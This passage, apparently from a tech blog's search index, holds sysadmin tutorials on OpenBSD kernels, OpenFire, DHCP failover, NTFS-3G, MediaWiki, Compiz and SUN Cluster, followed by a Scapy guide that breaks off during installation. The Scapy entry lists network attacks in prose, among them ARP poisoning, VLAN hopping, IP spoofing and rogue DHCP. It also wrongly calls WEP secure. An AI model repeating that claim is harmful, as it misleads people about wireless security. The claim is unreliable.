                content: "Introduction linkFor those coming from the Linux world, they’ll find that this is super simple on BSD. In my case, I have a multicore server, and after installing BSD, it only detects one core. It’s a shame to run with just one core when you have several. I’ll explain here the procedure to switch to multicore, but this works with other kernel modifications as well!\nSingle Core to Multicore linkDuring installation, you need to select the “bsd.mp” kernel. When the machine reboots after installation, it boots on the single-core kernel. We will therefore move the current kernel and replace it with the multicore one. To do this, it’s very simple:\nmv /bsd /bsd.mono Here we moved the old kernel to bsd.mono (for single processor) and now we’ll rename the multiprocessor kernel to the default kernel name (because /bsd is the default kernel):\nmv /bsd.mp /bsd Now all you have to do is reboot. That wasn’t complicated, was it?\nBooting on Another Kernel linkIf you don’t want to boot with the default kernel, you can do this before the kernel loads:\nboot\u003e b /bsd.mono or\nboot\u003e boot hd0a:/bsd.mono "
            }
        );
    index.add(
            {
                id:  715 ,
                href: "\/OpenFire_:_Installation_d\u0027OpenFire\/",
                title: "OpenFire: Installation of OpenFire",
                description: "A guide to install and configure OpenFire, the most functional Jabber server, with integration capabilities for LDAP, Oracle, and MySQL.",
                content: "Introduction linkOpenFire is currently the most functional Jabber server available. It offers very interesting features, though some are paid.\nIt’s still very integratable with technologies such as LDAP, Oracle, or MySQL.\nDownload linkTo install it, it’s really not difficult. We download it from the official website:\nwget 'http://www.igniterealtime.org/downloadServlet?filename=openfire/openfire_3_3_0.tar.gz' Then we need to download Java Linux (self-extracting file):\nwget 'http://javadl.sun.com/webapps/download/AutoDL?BundleId=11187' Installation linkNext we extract Java:\nsh jre-6u1-linux-i586.bin We’ll do the same with OpenFire:\ntar -xzvf openfire_3_3_0.tar.gz Put everything in /usr/share/openfire for example and install it all:\nmkdir /usr/share/openfire mv jre1.6.0_01 openfire /usr/share/openfire Configuration linkMySQL linkWe need to create a database where data will be stored, then create the necessary components:\nmysql -uroot -p create database openfire; quit; mysql -uroot -p openfire \u003c /usr/share/openfire/openfire/resources/database/openfire_mysql.sql I recommend doing at least minimal security measures. That means at least a dedicated user and restricted rights to the database. Using everything as root is far from secure!\nEnvironment linkAll that’s left is to add this to the ~/.bashrc, ~/.zshrc or other configuration file for the user who will run OpenFire:\nexport INSTALL4J_JAVA_HOME=/usr/share/openfire/jre Then, restart the session and launch it:\ncd /usr/share/openfire/openfire/bin \u0026\u0026 openfire start \u0026 Automatic Startup at Boot linkTo launch it at boot, it’s easy as usual, just add the line above to /etc/rc.local.\nAlternatively, in the extras directory (/usr/share/openfire/openfire/bin/extras), you’ll find a ready-made script to start it as a service.\nFAQ linkManaging Memory Usage linkIf you’re using OpenFire for personal needs, there’s too much RAM allocated by default. If you need more, this FAQ is also good for you ;-).\nFor those with limited Java knowledge, I’ll explain a bit how it works. We have 2 limits:\nXms: RAM will be directly allocated for the program, even if it uses less Xmx: Maximum memory the program can use before using the garbage collector (attempting to recover unused RAM). Edit the bin/openfire file in your OpenFire folder and find the variable INSTALL4J_ADD_VM_PARAM. Then adjust to your needs:\nINSTALL4J_ADD_VM_PARAMS=\"-Xms16m -Xmx32m\" Resources linkDocumentation on OpenFire and Spark installation\n"
            }
        );
    index.add(
            {
                id:  716 ,
                href: "\/anatomie-d-un-filesystem-linux\/",
                title: "Anatomy of a Linux Filesystem",
                description: "Documentation explaining how Linux filesystems work and their structure",
                content: "Here is good documentation for people who want to understand how the Linux filesystem works:\nDocumentation on Anatomy of a Linux FileSystem\n"
            }
        );
    index.add(
            {
                id:  717 ,
                href: "\/Mise_en_place_d\u0027un_DHCP_Failover\/",
                title: "Setting up DHCP Failover",
                description: "A guide on how to configure DHCP failover between two servers using ISC DHCP server version 3 on OpenBSD systems.",
                content: "Introduction linkI’ve been running a DHCP server on my home network for eons now, and today I decided I’d move it on to my OpenBSD firewall cluster. It probably really shouldn’t be there but I already run a handful of other internal services there, like DNS, and NTP.\nI assume you already have a working dhcpd configuration for your single server, if you don’t, then you can get a basic DHCP configuration from the OpenBSD FAQ.\nInstallation linkYou need ISC’s DHCP server (at least version 3), to do DHCP failover. As of OpenBSD 4.1, they ship version 2 by default. You can get version 3 out of the packages tree by installing isc-dhcp-server-3.0.4p0.tgz. It installs itself into /usr/local, so if you want to view the man pages, you have to do something like:\nexport MANPATH=/usr/share/man:/usr/local/man otherwise, you won’t see the new man pages for the config files.\nConfiguration linkOnce you have it installed, you need to get it configured to run at startup. I did it by adding the following lines to my /etc/rc.conf.local file:\n# turn on dhcpd3 dhcpd3=YES dhcpd3_flags=\"-pf /var/run/dhcpd.pid\" I then added some stuff to my /etc/rc.local file:\n# ISC dhcpd3 with failover configured if [ X\"${dhcpd3}\" == X\"YES\" -a -x /usr/local/sbin/dhcpd -a -f /etc/dhcpd.conf ]; then touch /var/db/dhcpd.leases if [ -f /etc/dhcpd.interfaces ]; then dhcpd_ifs=`stripcom /etc/dhcpd.interfaces` fi echo -n ' dhcpd' /usr/local/sbin/dhcpd ${dhcpd3_flags} ${dhcpd_ifs} fi This will get the new version of DHCP started at boot time. You ought to remember to disable the other dhcpd by putting this line in your rc.conf.local:\ndhcpd_flags=NO # for normal use: \"\" Now that you are already to start it up, we need to get the /etc/dhcpd.conf file ready. You probably already have one configured and working. If so then just do something like:\n# mv /etc/dhcpd.conf /etc/dhcpd.master and then create a new dhcpd.conf file for your primary node that looks like this:\n# # dhcpd configuration # # failover definition failover peer \"dhcp-failover\" { primary; # declare ourselves primary address 192.168.13.6; port 520; peer address 192.168.13.7; peer port 520; max-response-delay 10; max-unacked-updates 10; load balance max seconds 3; mclt 1800; split 128; } # include the rest. This allows us to copy dhcpd.master # between the two machines safely include \"/etc/dhcpd.master\"; The method to my madness is simple. The contents of /etc/dhcpd.master can be exactly replicated between you two dhcp servers. This is where you will have all your subnets, ranges, mac addresses, etc.etc. Use your favorite method to keep them synched. The contents of /etc/dhcpd.conf are different on the primary dhcp server and the secondary. You obviously wouldn’t want to be copying them all over the place.\nSome comments on the new dhcpd.conf file. The “dhcp-failover” string in the\nfailover peer \"dhcp-failover\" { line can be whatever you want, but we’re going to use it in several other places, and it has to be the same in all of those places. You would of course replace the appropriate address and peer address IP addresses with the ones of the two servers you will be balancing.\nThe /etc/dhcpd.conf file on the secondary server looks like this: # # dhcpd configuration # # failover definition failover peer \"dhcp-failover\" { secondary; # declare ourselves secondary address 192.168.13.7; port 520; peer address 192.168.13.6; peer port 520; max-response-delay 10; max-unacked-updates 10; load balance max seconds 3; } # include the rest. This allows us to copy dhcpd.master # between the two machines safely include \"/etc/dhcpd.master\"; Notice the changes from the primary config file. The addresses and peer addresses are swapped, and there a couple of missing config lines, that must not be present.\nThe final step is to modify our /etc/dhcpd.master file so that it knows that it should be failing over. Here is a small snippet from mine:\nsubnet 192.168.13.0 netmask 255.255.255.0 { option routers 192.168.13.1; option broadcast-address 192.168.13.255; pool { failover peer \"dhcp-failover\"; deny dynamic bootp clients; range 192.168.13.32 192.168.13.47; } } The only new thing here is the failover peer line. The string there needs to be the same one that we used in our /etc/dhcpd.conf file.\nThat’s it. Now to test it out.\nVerification linkYou can fire up the server and prevent if from forking and logging to standard out by doing something like:\n# /usr/local/sbin/dhcpd -pf /var/run/dhcpd.pid -d -f xl0 You would of course replace “xl0” with the interface on your machine you want the server to listen on. Look for error messages, etc. If things are going right, you should see something like this:\nInternet Systems Consortium DHCP Server V3.0.4 Copyright 2004-2006 Internet Systems Consortium. All rights reserved. For info, please visit http://www.isc.org/sw/dhcp/ Wrote 0 deleted host decls to leases file. Wrote 0 new dynamic host decls to leases file. Wrote 8 leases to leases file. Multiple interfaces match the same subnet: xl0 carp0 Multiple interfaces match the same shared network: xl0 carp0 Multiple interfaces match the same subnet: xl0 carp2 Multiple interfaces match the same shared network: xl0 carp2 Multiple interfaces match the same subnet: xl0 carp3 Multiple interfaces match the same shared network: xl0 carp3 Listening on BPF/xl0/00:01:03:d6:82:a1/192.168.13/24 Sending on BPF/xl0/00:01:03:d6:82:a1/192.168.13/24 Sending on Socket/fallback/fallback-net failover peer dhcp-failover: I move from normal to startup failover peer dhcp-failover: peer moves from normal to communications-interrupted failover peer dhcp-failover: I move from startup to normal failover peer dhcp-failover: peer moves from communications-interrupted to normal pool 80f93200 192.168.15/24 total 16 free 16 backup 0 lts -8 pool 80f93100 192.168.13/24 total 16 free 8 backup 7 lts 0 pool 80f93200 192.168.15/24 total 16 free 16 backup 0 lts 8 Now you can try to get a client on your network to request an address, and you should see it happen. If that all works right, then you should try rebooting your machines, making sure that everything comes up properly on startup. You can now experiment with taking one or the other server down, and you should still be able to DHCP properly.\n"
            }
        );
    index.add(
            {
                id:  718 ,
                href: "\/Installation_et_Configuration_de_KeepAlived\/Pound_avec_Failover_et_support_de_session\/",
                title: "Installation and Configuration of KeepAlived/Pound with Failover and Session Support",
                description: "Documentation about setting up KeepAlived and Pound with failover and session support as an alternative to Heartbeat 2.",
                content: "Here’s a great documentation I found for anyone who doesn’t want to use Heartbeat 2.\nDocumentation about Pound and KeepAlived\n"
            }
        );
    index.add(
            {
                id:  719 ,
                href: "\/R%C3%A9cup%C3%A9rer_ses_donn%C3%A9es_depuis_un_RAID1_LVM\/",
                title: "Recovering Data from a RAID1 LVM",
                description: "How to recover data from a LVM in RAID1 configuration",
                content: "Here is documentation explaining how to recover your data from a LVM in RAID1!\nDocumentation on Recovering Data From RAID1 LVM Partitions\n"
            }
        );
    index.add(
            {
                id:  720 ,
                href: "\/MacFuse_%20_NTFS-3G_:_Lecture_et_%C3%A9criture_de_partitions_NTFS_sur_Mac_OS_X\/",
                title: "MacFuse + NTFS-3G: Reading and Writing NTFS Partitions on Mac OS X",
                description: "Tutorial for installing and configuring MacFuse and NTFS-3G to enable read and write access to NTFS partitions on Mac OS X",
                content: "Introduction linkEven with the release of Leopard (10.5), everyone thought they would have NTFS write support. We had already missed out on user-friendly native ZFS…\nIn short, if you want to be able to write to NTFS partitions, you need to install MacFuse and NTFS-3G. Here’s how to proceed.\nPrerequisites link MacFuse: http://code.google.com/p/macfuse/ MacPorts: http://www.macports.org/ X11: Mac OS X DVD XCode: Mac OS X DVD Installation linkIt’s fairly simple - download the MacPorts and MacFuse packages and install them. For the rest, everything is on the Leopard DVD.\nConfiguration linkMacPorts linkIf this is your first MacPorts installation, run this command:\nexport PATH=/opt/local/bin:/opt/local/sbin:$PATH Then we’ll install what we need. But first, let’s get the MacPorts package list:\nsudo port -d selfupdate Next, install pkgconfig and ntfs-3g:\nsudo port install pkgconfig ntfs-3g Usage linkIf you have Bootcamp installed or if your NTFS partition is already mounted, check the corresponding device using the “df” command:\nmac% df Filesystem 512-blocks Used Available Capacity Mounted on /dev/disk0s2 127664128 60996656 66155472 48% / devfs 212 212 0 100% /dev fdesc 2 2 0 100% /dev map -hosts 0 0 0 100% /net map auto_home 0 0 0 100% /home /dev/disk0s3 67035608 28905504 38130104 44% /Volumes/Untitled Here, /dev/disk0s3 corresponds to Windows. So I’ll unmount the partition:\nsudo umount /Volumes/Untitled Next, I need to create a folder called Vista for example in Volumes, then mount my device in this folder:\nsudo mkdir /Volumes/Vista sudo ntfs-3g /dev/disk0s3 /Volumes/Vista -o ping_diskarb,volname=\"Vista\" Then if you run df, it should appear and you can now access it :-)\nmac% df Filesystem 512-blocks Used Available Capacity Mounted on /dev/disk0s2 127664128 60997024 66155104 48% / devfs 223 223 0 100% /dev fdesc 2 2 0 100% /dev map -hosts 0 0 0 100% /net map auto_home 0 0 0 100% /home /dev/disk0s3 67035608 28905504 38130104 44% /Volumes/Vista "
            }
        );
    index.add(
            {
                id:  721 ,
                href: "\/Installer_OSX_depuis_un_disque_externe\/",
                title: "Installing OSX from an External Drive",
                description: "How to install OSX when your Mac doesn't have a working DVD drive by using an external drive.",
                content: "Introduction linkMaybe your machine doesn’t have a DVD drive or it’s simply not working. How can you install OSX again? The solution is here…\nInstructions link Create a disk image using Disk Utility (on Mac A) Transfer the .dmg file to the target computer (Mac B) via FireWire or Ethernet You’ll need an external FireWire hard drive, name it “Mac OS X Install DVD” with Disk Utility Select the newly created partition and click on the Restore tab Drag and drop the Tiger disk image into Source and the new partition into Destination. Then click on Restore Once the restoration is complete, go to System Preferences / Startup Disk, choose the new partition as the startup disk, then restart "
            }
        );
    index.add(
            {
                id:  722 ,
                href: "\/Utilisation_avanc%C3%A9e_de_Mediawiki\/",
                title: "Advanced Usage of MediaWiki",
                description: "Advanced usage of MediaWiki features including dynamic tables, table simplification, and sorting capabilities.",
                content: "Introduction linkWe’re very far from realizing how powerful MediaWiki truly is. Those who are familiar with Confluence (a wiki solution more targeted at businesses) know that MediaWiki is far ahead and can sometimes be complex when you want to add dynamic features to your wiki.\nThat’s why I’ll try to document the advanced uses of MediaWiki here.\nIf you’re just starting with MediaWiki, I recommend first reading this.\nUses linkTables linkDynamic Modifications linkYou should read the table writing simplification before continuing. Edit your template and look at the example below:\n|- |align=\"left\"|{{{1}}} |align=\"center\" {{#switch: {{{2|}}} | yes | YES | Yes = style=\"background:palegreen\" | no | NO | No = style=\"background:salmon\" | partial | PARTIAL | Partial = style=\"background:skyblue\"}}|{{{2}}} |align=\"center\" {{#switch: {{{3|}}} | yes | YES | Yes = style=\"background:palegreen\" | no | NO | No = style=\"background:salmon\" | partial | PARTIAL | Partial = style=\"background:skyblue\"}}|{{{3}}} |align=\"left\"|{{{4}}} Let’s study the columns:\n1st: this one should be familiar to you 2nd: We use the #switch to indicate that we want to change data according to the content of the text in the cell: I have “yes, YES or Yes” here, if one of them matches, then I apply a different background color.\nIf it’s “no, NO or No”, it’s yet another color.\nAnd if it’s “partial, PARTIAL or Partial”, then it’s still another color.\n3rd: it’s the same as above, for developers, it resembles a type of if statement, so they won’t be too lost. 4th: a simple column. Simplification of Table Writing linkBy default, writing tables isn’t particularly simple. That’s why we’ll create a template to provide a simple writing order. We’ll call this template “infos” ({{infos}}) and populate it like this:\n|- |align=\"left\"|{{{1}}} |align=\"center\"|{{{2}}} |align=\"center\" style=\"background:pink\"|{{{3}}} Here, I have 3 columns:\n1st: text left-aligned 2nd: centered text 3rd: centered text + pink background fill So far, this is relatively simple. Then for writing your table, you’ll proceed like this:\n{| width=\"100%\" border=\"1\" !Name !First Name !Company {{infos|Bill|Gates|Microsoft}} {{infos|Steve|Jobs|Apple}} {{infos|Linus|Torvald||}} |} Still with our 3 columns, we tell it to use the infos template, then fill in the fields. When a field is not available, we leave it blank but be careful not to forget to put a “|” (pipe) even if we have no more information to fill in!\nSorting linkMediaWiki has a default sorting function for its tables. Once your table is made, you’ll have the possibility to sort alphabetically for example. The best part is that this solution is ultra-simple to implement! See for yourself… at the beginning of your table, just add class=“wikitable sortable”:\n{| class=\"wikitable sortable\" width=\"100%\" border=\"1\" Once you’ve saved or previewed, you’ll be able to sort your columns alphabetically.\n"
            }
        );
    index.add(
            {
                id:  723 ,
                href: "\/Utilisation_basique_de_Mediawiki\/",
                title: "Basic Usage of MediaWiki",
                description: "A concise guide to the basic features of MediaWiki, including links, lists, formatting, and code blocks",
                content: "Introduction linkFor those who want to get started with MediaWiki, it’s a good step. Since the documentation on the site is complex and abundant, here’s a small summary of what is necessary to have the basics.\nLinks linkHow to create a link to a workshop page?\nCopy and paste its complete title (from the page header), and insert it in your text in the following format:\n[[Title]] For example, a link to this help page would be written as:\n[[Modification of Basic Usage of MediaWiki]] However, if it’s a category page, you’ll need to add a colon (:) before the title:\n[[:Title]] For example, a link to the category titled Category:Undetermined solution would be written:\n[[:Category:Undetermined solution]] To specify the label of an internal link to a workshop page, use the syntax:\n[[Title|label]] (Note the vertical bar | that separates the URL and the label)\nHow to link to an external page linkSimply entering the URL in your text is enough to generate a clickable link:\nhttp://example.org If you want to specify the label of the link, use the syntax:\n[http://example.org label] (Note the presence of a single bracket, and the space that separates the URL and the label)\nLists linkHow to create an unordered list (bulleted list) linkPlace each item of the list on a line beginning with an asterisk *:\n* item 1 * item 2 * item 3 item 1 item 2 item 3 How to create an ordered list (numbered list) linkPlace each item of the list on a line beginning with a hash #:\n# item 1 # item 2 # item 3 item 1 item 2 item 3 How to create nested lists linkFor a second-level list, use two asterisks * or two hashes #:\n* level 1 item ** level 2 item level 1 item level 2 item # level 1 item ## level 2 item level 1 item level 2 item (Use 3 asterisks * or 3 hashes # for a 3rd level list, etc.)\nBold and italic linkHow to italicize text linkSurround the expression to be italicized with two single apostrophes ‘’:\nIn my sentence, an italicized expression…\nIf you want the entire line to be in italics, just put ’’ at the beginning.\nHow to make text bold linkSurround the expression to be bolded with three single apostrophes ‘’’: In my sentence, a bold expression…\nIf you want the entire line to be bold, just put ’’’ at the beginning.\nCode blocks linkHow to create a code element linkBy simply writing the element ;):\nHere is an expression in CSS: background-color: #fff;…\nHow to create a pre element linkBy simply writing the element ;):\nbackground-color: #fff; color: #000 ... How to escape wiki syntax linkIf you want to quote an element of the wiki syntax above without it being interpreted, use the syntax:\n... I’m using Wikipedia’s wiki syntax, but it doesn’t always work. Why? linkUnlike regular wikis based on MediaWiki (such as Wikipedia), several syntaxes have been disabled for public editing in the Opquast workshop: particularly the creation of new categories, adding titles and subtitles, and templates. These elements are indeed managed directly by our workflow.\n"
            }
        );
    index.add(
            {
                id:  724 ,
                href: "\/Compiz_:_Mise_en_place_d\u0027un_bureau_3D\/",
                title: "Compiz: Setting Up a 3D Desktop",
                description: "Guide to setting up Compiz for a 3D desktop environment on Linux systems",
                content: "Introduction linkFor those who are not familiar, Compiz is one of the simplest ways to have a 3D desktop. Unlike compiz-fusion, it is less advanced, but already offers many features. Here, we’ll see how to do a quick and simple deployment.\nInstallation linkFor the installation, we will install all the compiz packages:\napt-get install compiz compiz-core compiz-gnome compiz-gtk compiz-plugins libdecoration0 Note: Replace gnome with kde in the package name if you are using KDE.\nConfiguration linkDrivers linkMake sure your NVIDIA drivers are properly installed (I was only able to test with NVIDIA). Install your kernel headers, gcc, and then install the drivers. Don’t forget to stop X before installing the NVIDIA drivers:\n/etc/init.d/gdm stop Note: Or kdm for KDE\nTo test that your drivers are properly installed with 3D acceleration, you can run glxgears. If it’s choppy, your drivers were not installed correctly:\nglxgears xorg.conf linkCreate a backup of your current file:\ncp /etc/X11/xorg.conf /etc/X11/xorg.conf.bak Then add this to the file /etc/X11/xorg.conf:\nSection \"Device\" Identifier \"nVidia Corporation G70 [GeForce 7600 GT]\" Driver \"nvidia\" Option \"XAANoOffscreenPixmaps\" \"true\" Option \"AllowGLXWithComposite\" \"true\" Option \"TripleBuffer\" \"true\" EndSection Then add the following at the end of the file:\nSection \"Extensions\" Option \"Composite\" \"Enable\" Option \"RenderAccel\" \"true\" Option \"AllowGLXWithComposite\" \"true\" EndSection Now restart your graphical session:\n/etc/init.d/gdm start GNOME linkFor GNOME, we’ll just indicate that we want to use the 3D cube and some nice effects:\ngconftool --set /apps/compiz/general/allscreens/options/active_plugins --type list --list-type string '[gconf,png,svg,decoration,wobbly,fade,minimize,cube,rotate,zoom,scale,move,place,switcher,screenshot,resize]' Launch linkNow that everything is set up, you can launch compiz with this command:\ncompiz --replace References linkNVIDIA Drivers Compiz Website Compiz Fusion for those who want more advanced effects\n"
            }
        );
    index.add(
            {
                id:  725 ,
                href: "\/Introduction_et_Architechture_de_mise_en_place_d\u0027un_Cluster_SUN\/",
                title: "Introduction and Architecture of Setting Up a SUN Cluster",
                description: "An introduction to SUN Clustering technology, including types of clusters, definitions, infrastructure components, and configuration details.",
                content: "Introduction linkThe SUN Cluster Suite is also called SunPlex. I could not explain all here, and you should know well clustering basics.\nTypes of Clusters linkThere are 2 types of clusters:\nCluster HA: High Availability Cluster Cluster HPC: High Performance Computing Definitions link Scalable: Add instances for the same application (e.g. Apache) Unaware applications: non-clustered applications SPOF: Single Point of Failure (e.g. Only one network card is on a node instead of two) RGM: Resources Group Manager Data Service: it’s an agent generated by RGM IPMP: It controls network failures (\u003e SunPlex v3.0) (Similar to Bonding on Linux) DPM: Disk Path Monitoring (hard drive monitoring…works with I/O access, so if no traffic runs on the drive, no error can be found) Application Traffic Striping: Virtual private IP address (must be network class B \u003c SunPlex v3.1) SCI: This is a shared memory technology for clusters. With this each node can view the memory of each other. Containers: Zones + RGM Amnesia: Amnesia occurs when a node is booting but can’t join the cluster because another node hasn’t authorized it. So it’s waiting for authorization. Solaris Zone linkA Solaris zone is a virtual zone that encapsulates a service (e.g. Apache). The advantage is that we can manage the maximum processor percentage or the maximum memory that the service can use. Many other features are available. A zone can be clustered \u003e SunPlex v3.1; for older versions, you can cluster the global zone.\nThere is a Global zone which distributes a Virtual OS, but it’s not virtualization. It’s only to manage CPU, memory…\nCluster application creator link3 ways to build a service for a cluster:\nBy hand in init.d SCDS Builder: this is a template generator, then edit by hand GDS: GUI for creating a service. User-friendly but not very performant How to know my release linkTo know your release, you must identify the one you want. For Solaris release:\ncat /etc/release And for SunPlex release:\ncat /etc/cluster/release Infrastructure linkNetwork linkFor a cluster infrastructure, you need network load balancing. For that, you need 2 network cards. Both cards (on each node) should be connected with an inverted cable. And both second ones should be connected to a switch.\nThis solution is applicable only if you have 2 nodes. If you have more, you must not connect with inverted cables. You must connect all your interfaces to redundant switches.\nCMM linkCMM (Cluster Membership Monitor) is able to rebuild node configurations. This could occur when node heartbeats are different.\nThe configuration repository is stored in the CCR. It contains:\nCluster and node names Cluster transport configuration The names of registered VERITAS disk groups or Solaris Volume Manager software disksets A list of nodes that can master each disk group Information about NAS devices Data service operational parameter values (timeouts) Paths to data service callback methods Disk ID (DID) device configuration Current cluster status Global File System linkGlobal File System is also called GFS. This is for sharing filesystems with all the nodes. With GFS, you will have a new devices name folder called DID (Disk ID).\nYou can find it in:\n/dev/did/sdk /dev/did/rdsk (directories) For example, if one of my nodes doesn’t have a CD ROM, and I want to share it to be viewed like a device on the other nodes, I can do it with GFS. Or if I want to share the same partition of my NAS with all nodes it’s possible.\nThis command will mount one of my volumes on all nodes:\nmount -o global,logging /dev/vx/dsk/nfs-dg/vol-01 /global/nfs Adding a hardware device:\nYou have to configure it to be recognized by the computer Then with devfsadm, you have to configure it for the OS Then, with sgdevs, you can configure it for the cluster. As soon as we have a node which has no SAN access, we must use GFS to share files. By that way, the external nodes (regarding SAN) are able to connect to the SAN by using private network from the other SAN connected nodes. Buffered I/O will go on one other node after the timeout (in error case).\nEFI linkEFI means Extended File System. This enables partitions larger than some Terabytes to be recognized. The old one was called SMI.\nDifferences between SMI and EFI:\nSMI had a VTOC of 1 sector on the hard drive. EFI has a VTOC of 34 sectors. In a conventional partition type, S2 represents the disk’s total space, and only on EFI, S8 is reserved. S0 to S7 are available to make partitions. When you launch format command:\nformat -e You can choose between SMI or EFI.\nLocalFS or Failover FileSystem linkIf you don’t want to use GFS, you can use LocalFS. It’s for passive/active cluster architecture.\nRemotely Access linkTo access simultaneously to remote nodes, you can install one of these packages:\ncconsole: cluster console crlogin: for rlogin crtelnet: for telnet Fencing linkThe fencing is the SCSI reservation in failure case. Each node of your cluster has a quorum of 1. The number of the quorum increases if there is a priority node due to another crash node.\nFor example, with a SAN, the good node will delete the other SCSI reservation to become the bigger one. As soon as the cluster is repaired, all the nodes will take back the “1” value.\nThe last switched off node must be the first switched on\nFor example:\nN2 stop N1 + Quorum +1 – modifications – N1 stop N2 boot N2 boot failure because N1 has deleted SCSI reservation for N2 A calculation is available to know maximum devices:\nn - 1 = max devices n represents the number of nodes.\n"
            }
        );
    index.add(
            {
                id:  726 ,
                href: "\/Scapy_:_Trames_et_paquets_de_donn%C3%A9es\/",
                title: "Scapy: Data Frames and Packets",
                description: "A comprehensive guide to using Scapy for network packet manipulation, inspection and analysis. Learn how to forge, receive and send data packets over a network with this powerful Python tool.",
                content: "Introduction linkScapy is a utility that allows you to forge, receive and send packets or data frames over a network for a multitude of protocols. In this introduction, you’ll discover this Python utility that enables traffic capture, network mapping, ARP cache poisoning, VLAN hopping, or passive operating system fingerprinting.\nScapy is a program developed in Python by Philippe Biondi (EADS CCR); it notably allows you to forge, receive and transmit packets and/or data frames via a network to or from an IT infrastructure for a multitude of different network protocols (IP, TCP, UDP, ARP, SNMP, ICMP, DNS, DHCP, …) with precision and speed.\nScapy comes in the form of a single Python script file - 13,342 lines of code for version 1.1.1 that we’ll use throughout this document. Among other notable features of Scapy, we’ll note its ability to dissect packets and/or data frames as well as decode certain protocols.\nFurthermore, Scapy can also perform network traffic monitoring and capture similar to reading pcap format captures from another traffic analyzer like Wireshark, for example.\nIt’s also possible with Scapy to generate graphs in 2D and/or 3D from packets and/or data frames, or even port scanning like NMAP and passive remote operating system recognition like p0f.\nAccording to its author, Scapy is capable by itself of replacing all of the following utilities: hping, 85% of NMAP, arpspoof, arp-sk, arping, tcpdump, tethereal, p0f and many other system commands (traceroute, ping, route, …).\nFor the equivalent of about sixty lines of C code, the combination of Python and Scapy only requires a few lines most of the time to perform these different packet and/or data frame manipulation operations, resulting in considerable time savings for anyone who needs to perform this type of manipulation on a network.\nFor this, Scapy has many pre-defined functions allowing you to configure the injection of a packet (or frame) into a given network connection; some special functions of Scapy thus make it possible to perform common attacks with great simplicity (non-exhaustive list): network infrastructure mapping, ARP Cache Poisoning, Smurfing, VLAN Hopping as well as IP spoofing and rogue DHCP server setup.\nThese attacks can be combined with each other (ARP Cache Poisoning + VLAN Hopping for example) to perform security audits specifically adapted to the infrastructure in place whose security level you want to verify.\nYou can just as well intercept VOIP communications (packet/frame decoding) and this even on a WEP encrypted WIFI wireless connection as long as you know the decryption key associated with these connections (knowing of course that WEP is still secure).\nThis encryption key can be configured in Scapy, still provided that you have it, so that Scapy can use it during packet or data frame injection operations into the traffic of a WEP-encrypted wireless network (see also the WIFITAP utility developed by Cédric Blancher [EADS CCR] for traffic injection into WIFI connections).\nInstallation and configuration linkThis section concerns the installation of Scapy as well as all the elements necessary for its proper functioning on a GNU/LINUX system. It also includes Scapy’s internal configuration system as a first approach to the utility as well as the different network configurations necessary for its use for the rest of this document.\nLet’s perform the preliminary installation necessary for using Scapy on a Debian/Ubuntu-like Linux operating system:\nroot@casper:~# uname -a Linux casper 2.6.20-15-generic #2 SMP Sun Apr 15 07:36:31 UTC 2007 i686 GNU/Linux root@casper:~ # apt-get install python python-gnuplot python-pyx python-crypto graphviz imagemagick python-visual First, we test that the Python interpreter is working properly:\nroot@casper:~# python Python 2.5.1 (r251:54863, May 2 2007, 16:56:35) [GCC 4.1.2 (Ubuntu 4.1.2-0ubuntu4)] on linux2 Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. \u003e\u003e\u003e Type “ctrl D” to exit Python.\nWe access the /etc directory on our system:\nroot@casper:~ # cd /etc/ Then we retrieve the ethertypes file:\nroot@casper:/etc # wget www.secdev.org/projects/scapy/files/ethertypes 02:41:59 (936.05 KB/s) - `ethertypes' saved [1,317/1,317] We then access the personal directory of the current session user (here the root user with /root as the home directory ~):\nroot@casper:/etc # cd ~ Now we configure the network interfaces present on the operating system of the machine that we are using for all the tests in this document; this information will help better understand the different tests we will be performing:\nroot@casper:~# lspci | grep 802.11 08:00.0 Ethernet controller: Atheros Communications, Inc. AR5212 802.11abg NIC (rev 01) root@casper:~# wlanconfig ath0 destroy root@casper:~# wlanconfig ath0 create wlandev wifi0 wlanmode adhoc root@casper:~# iwconfig ath0 essid nat root@casper:~# ifconfig ath0 192.168.0.2 root@casper:~# route add default gw 192.168.0.1 root@casper:~# ifconfig ath0 Link encap:Ethernet HWaddr 00:15:6D:53:1E:87 inet addr:192.168.0.2 Bcast:192.168.0.255 Mask:255.255.255.0 inet6 addr: fe80::215:6dff:fe53:1e87/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:3867 errors:0 dropped:0 overruns:0 frame:0 TX packets:3719 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:3782362 (3.6 MiB) TX bytes:520446 (508.2 KiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:50 errors:0 dropped:0 overruns:0 frame:0 TX packets:50 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:4307 (4.2 KiB) TX bytes:4307 (4.2 KiB) wifi0 Link encap:UNSPEC HWaddr 00-15-6D-53-1E-87-00-00-00-00-00-00-00-00-00-00 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:179191 errors:0 dropped:0 overruns:0 frame:7162 TX packets:4355 errors:147 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:199 RX bytes:8345718 (7.9 MiB) TX bytes:668330 (652.6 KiB) Interrupt:18 root@casper:~# iwconfig lo no wireless extensions. eth0 no wireless extensions. wifi0 no wireless extensions. ath0 IEEE 802.11g ESSID:\"nat\" Nickname:\"\" Mode:Ad-Hoc Frequency:2.462 GHz Cell: 02:15:6D:53:1E:87 Bit Rate:0 kb/s Tx-Power:16 dBm Sensitivity=1/1 Retry:off RTS thr:off Fragment thr:off Encryption key:off Power Management:off Link Quality=26/70 Signal level=-70 dBm Noise level=-96 dBm Rx invalid nwid:1181 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:0 Missed beacon:0 The section above needs to be adapted to each machine configuration depending on the network interfaces present; for the next part we test that network connectivity is working properly:\nroot@casper:~# ping -c 1 192.168.0.1 PING 192.168.0.1 (192.168.0.1) 56(84) bytes of data. 64 bytes from 192.168.0.1: icmp_seq=1 ttl=128 time=1.40 ms --- 192.168.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 1.409/1.409/1.409/0.000 ms That’s it, our machine with IP address 192.168.0.2 is able to ping the machine with IP address 192.168.0.1; we can now proceed to install Scapy by first downloading it:\nroot@casper:~ # wget www.secuobs.com/scapy.py 01:44:27 (61.29 